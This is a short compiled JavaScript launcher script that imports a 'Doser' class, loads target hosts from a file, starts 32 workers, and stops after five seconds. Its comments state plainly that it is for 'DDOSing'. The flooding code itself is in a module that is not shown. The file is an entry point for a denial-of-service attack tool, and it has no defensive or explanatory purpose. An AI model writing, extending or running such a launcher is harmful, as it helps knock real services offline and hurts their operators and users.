"use strict";
exports.__esModule = true;
var doser_1 = require("./doser");
// Tutorial: https://khalilstemmler.com/blogs/typescript/node-starter-project/
var args = process.argv;
console.log('Script started: ', args);
var timeout = undefined;
function start() {
    var doser = new doser_1.Doser(true, 32);
    doser.listen('atack', function (data) { return console.log(data.log); });
    doser.listen('error', function (data) { return console.log(data.log); });
    //Load targets
    doser.loadHostsFile().then(function () {
        doser.start();
    })["catch"](function () {
        console.log('Error occurred while loading targets');
    });
    // doser.forceProxy(true); // Use proxy to save the server
    // doser.setWorkersCount(32); // Count of workers
    doser.start(); //Start DDOSing
    //Turn this script off after some time
    timeout = setTimeout(function () {
        doser.stop();
    }, 5000);
}
start();
